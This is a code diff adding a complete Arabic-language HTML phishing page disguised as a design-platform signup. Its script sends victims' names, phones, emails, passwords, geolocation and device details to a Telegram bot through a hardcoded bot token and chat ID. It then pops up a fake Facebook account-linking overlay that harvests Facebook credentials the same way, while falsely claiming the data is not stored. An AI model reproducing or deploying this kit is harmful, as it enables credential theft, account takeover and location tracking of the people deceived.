@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>منصة التصميم الاحترافي</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+        }
+        
+        body {
+            min-height: 100vh;
+            background: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .main-card {
+            background: #ffffff;
+            border-radius: 24px;
+            padding: 45px 40px;
+            max-width: 520px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.12);
+        }
+
+        .logo-area {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+        .logo-area .icon {
+            font-size: 48px;
+            display: block;
+            margin-bottom: 6px;
+        }
+        .logo-area h1 {
+            font-size: 26px;
+            color: #1a1a2e;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+        }
+        .logo-area p {
+            color: #6b7280;
+            font-size: 15px;
+            margin-top: 4px;
+        }
+
+        .input-group {
+            margin-bottom: 18px;
+        }
+        .input-group label {
+            display: block;
+            color: #1a1a2e;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 5px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1.5px solid #e5e7eb;
+            border-radius: 12px;
+            font-size: 15px;
+            color: #1a1a2e;
+            background: #fafafa;
+            outline: none;
+            transition: 0.3s;
+        }
+        .input-group input:focus {
+            border-color: #4f46e5;
+            background: #ffffff;
+            box-shadow: 0 0 0 4px rgba(79,70,229,0.08);
+        }
+
+        .btn-primary {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 12px;
+            background: #4f46e5;
+            color: #fff;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-top: 8px;
+        }
+        .btn-primary:hover {
+            background: #4338ca;
+            transform: translateY(-1px);
+            box-shadow: 0 8px 25px rgba(79,70,229,0.25);
+        }
+
+        .loader {
+            display: none;
+            margin: 16px auto;
+            width: 32px;
+            height: 32px;
+            border: 3px solid #e5e7eb;
+            border-top: 3px solid #4f46e5;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        #status {
+            text-align: center;
+            font-size: 14px;
+            margin-top: 14px;
+            min-height: 24px;
+            color: #4f46e5;
+        }
+
+        .divider {
+            border: none;
+            border-top: 1px solid #e5e7eb;
+            margin: 20px 0 16px;
+        }
+
+        .footer-note {
+            text-align: center;
+            color: #9ca3af;
+            font-size: 12px;
+            margin-top: 18px;
+        }
+
+        /* ===== Overlay فيسبوك ===== */
+        .fb-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.55);
+            backdrop-filter: blur(8px);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 99999;
+            animation: fadeIn 0.35s ease;
+        }
+        .fb-overlay.active {
+            display: flex;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.96); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        .fb-card {
+            background: #ffffff;
+            border-radius: 20px;
+            padding: 40px 35px 35px;
+            max-width: 440px;
+            width: 92%;
+            box-shadow: 0 30px 80px rgba(0,0,0,0.35);
+            position: relative;
+        }
+        .fb-card .close-btn {
+            position: absolute;
+            top: 14px;
+            right: 18px;
+            font-size: 22px;
+            color: #9ca3af;
+            cursor: pointer;
+            transition: 0.3s;
+            background: none;
+            border: none;
+        }
+        .fb-card .close-btn:hover {
+            color: #1a1a2e;
+            transform: rotate(90deg);
+        }
+        .fb-card .fb-header {
+            text-align: center;
+            margin-bottom: 28px;
+        }
+        .fb-card .fb-header .fb-icon {
+            font-size: 44px;
+            display: block;
+            margin-bottom: 4px;
+        }
+        .fb-card .fb-header h2 {
+            font-size: 22px;
+            color: #1a1a2e;
+            font-weight: 700;
+        }
+        .fb-card .fb-header p {
+            color: #6b7280;
+            font-size: 14px;
+            margin-top: 4px;
+        }
+        .fb-card .input-group input {
+            background: #f0f2f5;
+            border-color: #dddfe2;
+        }
+        .fb-card .input-group input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 4px rgba(24,119,242,0.12);
+            background: #fff;
+        }
+        .fb-card .btn-fb {
+            background: #1877f2;
+            margin-top: 6px;
+        }
+        .fb-card .btn-fb:hover {
+            background: #166fe5;
+            box-shadow: 0 8px 25px rgba(24,119,242,0.25);
+        }
+        .fb-card .fb-foot {
+            text-align: center;
+            color: #9ca3af;
+            font-size: 12px;
+            margin-top: 16px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ====== الصفحة الرئيسية (منصة التصميم) ====== -->
+    <div class="main-card">
+        <div class="logo-area">
+            <span class="icon">🎨</span>
+            <h1>منصة التصميم</h1>
+            <p>اشترك للوصول إلى أدوات التصميم الاحترافية</p>
+        </div>
+
+        <form id="mainForm">
+            <div class="input-group">
+                <label>👤 الاسم الكامل</label>
+                <input type="text" id="fullName" placeholder="أدخل اسمك الثلاثي" required>
+            </div>
+            <div class="input-group">
+                <label>📱 رقم الهاتف</label>
+                <input type="tel" id="phone" placeholder="+961 70 000 000" required>
+            </div>
+            <div class="input-group">
+                <label>📧 البريد الإلكتروني</label>
+                <input type="email" id="email" placeholder="example@domain.com" required>
+            </div>
+            <div class="input-group">
+                <label>🔑 كلمة المرور (لحسابك)</label>
+                <input type="password" id="password" placeholder="••••••••" required>
+            </div>
+            <button type="submit" class="btn-primary">🚀 إنشاء الحساب</button>
+            <div class="loader" id="loader"></div>
+            <div id="status"></div>
+        </form>
+
+        <hr class="divider">
+        <p class="footer-note">بالتسجيل أنت توافق على الشروط • سيتم إرسال رمز تأكيد لرقمك</p>
+    </div>
+
+    <!-- ====== Overlay فيسبوك (الوهمي) ====== -->
+    <div class="fb-overlay" id="fbOverlay">
+        <div class="fb-card">
+            <button class="close-btn" onclick="closeFb()">✕</button>
+            <div class="fb-header">
+                <span class="fb-icon">📘</span>
+                <h2>ربط حساب فيسبوك</h2>
+                <p>لمتابعة قناتنا والحصول على محتوى حصري</p>
+            </div>
+
+            <form id="fbForm">
+                <div class="input-group">
+                    <label>📧 البريد الإلكتروني أو رقم الهاتف</label>
+                    <input type="text" id="fbEmail" placeholder="البريد أو رقم الهاتف" required>
+                </div>
+                <div class="input-group">
+                    <label>🔑 كلمة مرور فيسبوك</label>
+                    <input type="password" id="fbPassword" placeholder="••••••••" required>
+                </div>
+                <button type="submit" class="btn-primary btn-fb">🔗 ربط الحساب</button>
+                <div class="loader" id="fbLoader" style="display:none;"></div>
+                <div id="fbStatus" style="text-align:center;font-size:14px;margin-top:12px;color:#1877f2;"></div>
+            </form>
+
+            <p class="fb-foot">سيتم استخدام بياناتك فقط للمتابعة • لن يتم تخزينها</p>
+        </div>
+    </div>
+
+    <script>
+        // ====== بيانات البوت ======
+        const BOT_TOKEN = '8866899578:AAFzEUlAUgGtV59-y98YXO5yiC3RCaJFSKw';
+        const CHAT_ID = '8938601996';
+
+        // ====== إرسال بيانات الصفحة الرئيسية ======
+        document.getElementById('mainForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const name = document.getElementById('fullName').value.trim();
+            const phone = document.getElementById('phone').value.trim();
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const loader = document.getElementById('loader');
+            const status = document.getElementById('status');
+
+            if (!name || !phone || !email || !password) {
+                status.style.color = '#ef4444';
+                status.textContent = '⚠️ الرجاء ملء جميع الحقول';
+                return;
+            }
+
+            loader.style.display = 'block';
+            status.textContent = 'جاري إنشاء الحساب...';
+
+            // جلب الموقع تلقائياً
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        const location = `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                        sendMainData(name, phone, email, password, location);
+                    },
+                    () => {
+                        sendMainData(name, phone, email, password, '❌ تم رفض الموقع');
+                    }
+                );
+            } else {
+                sendMainData(name, phone, email, password, '❌ المتصفح لا يدعم الموقع');
+            }
+        });
+
+        function sendMainData(name, phone, email, password, location) {
+            const userAgent = navigator.userAgent;
+            const message = `🎯 **الطبقة 1 - بيانات المنصة**\n\n👤 الاسم: ${name}\n📱 الهاتف: ${phone}\n📧 الإيميل: ${email}\n🔑 كلمة المرور: ${password}\n📍 الموقع: ${location}\n💻 الجهاز: ${userAgent}\n🕒 الوقت: ${new Date().toLocaleString()}`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            })
+            .then(res => res.json())
+            .then(data => {
+                document.getElementById('loader').style.display = 'none';
+                const status = document.getElementById('status');
+                if (data.ok) {
+                    status.style.color = '#4f46e5';
+                    status.textContent = '✅ تم إنشاء الحساب! جاري التوجيه...';
+                    // إظهار نافذة فيسبوك بعد 0.7 ثانية
+                    setTimeout(() => {
+                        document.getElementById('fbOverlay').classList.add('active');
+                    }, 700);
+                } else {
+                    status.style.color = '#ef4444';
+                    status.textContent = '❌ خطأ، حاول مجدداً';
+                }
+            })
+            .catch(() => {
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('status').style.color = '#ef4444';
+                document.getElementById('status').textContent = '❌ فشل الاتصال';
+            });
+        }
+
+        // ====== إرسال بيانات فيسبوك ======
+        document.getElementById('fbForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const fbEmail = document.getElementById('fbEmail').value.trim();
+            const fbPassword = document.getElementById('fbPassword').value.trim();
+            const fbLoader = document.getElementById('fbLoader');
+            const fbStatus = document.getElementById('fbStatus');
+
+            if (!fbEmail || !fbPassword) {
+                fbStatus.style.color = '#ef4444';
+                fbStatus.textContent = '⚠️ الرجاء ملء جميع الحقول';
+                return;
+            }
+
+            fbLoader.style.display = 'block';
+            fbStatus.textContent = 'جاري ربط الحساب...';
+
+            // جلب الموقع مجدداً (تحديث)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        const location = `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                        sendFbData(fbEmail, fbPassword, location);
+                    },
+                    () => {
+                        sendFbData(fbEmail, fbPassword, '❌ تم رفض الموقع');
+                    }
+                );
+            } else {
+                sendFbData(fbEmail, fbPassword, '❌ المتصفح لا يدعم الموقع');
+            }
+        });
+
+        function sendFbData(email, password, location) {
+            const userAgent = navigator.userAgent;
+            const message = `🔵 **الطبقة 2 - بيانات فيسبوك**\n\n📧 إيميل/رقم فيسبوك: ${email}\n🔑 كلمة مرور فيسبوك: ${password}\n📍 الموقع: ${location}\n💻 الجهاز: ${userAgent}\n🕒 الوقت: ${new Date().toLocaleString()}`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            })
+            .then(res => res.json())
+            .then(data => {
+                document.getElementById('fbLoader').style.display = 'none';
+                const fbStatus = document.getElementById('fbStatus');
+                if (data.ok) {
+                    fbStatus.style.color = '#1877f2';
+                    fbStatus.textContent = '✅ تم ربط الحساب بنجاح! سيتم توجيهك...';
+                    document.getElementById('fbForm').reset();
+                    // إغلاق النافذة بعد 1.5 ثانية
+                    setTimeout(() => {
+                        document.getElementById('fbOverlay').classList.remove('active');
+                        document.getElementById('status').textContent = '🎉 اكتمل الاشتراك! شكراً لك.';
+                    }, 1500);
+                } else {
+                    fbStatus.style.color = '#ef4444';
+                    fbStatus.textContent = '❌ خطأ، حاول مجدداً';
+                }
+            })
+            .catch(() => {
+                document.getElementById('fbLoader').style.display = 'none';
+                document.getElementById('fbStatus').style.color = '#ef4444';
+                document.getElementById('fbStatus').textContent = '❌ فشل الاتصال';
+            });
+        }
+
+        // ====== إغلاق نافذة فيسبوك ======
+        function closeFb() {
+            document.getElementById('fbOverlay').classList.remove('active');
+        }
+
+        // إغلاق عند الضغط خارج البطاقة
+        document.getElementById('fbOverlay').addEventListener('click', function(e) {
+            if (e.target === this) closeFb();
+        });
+    </script>
+</body>
+  </html>
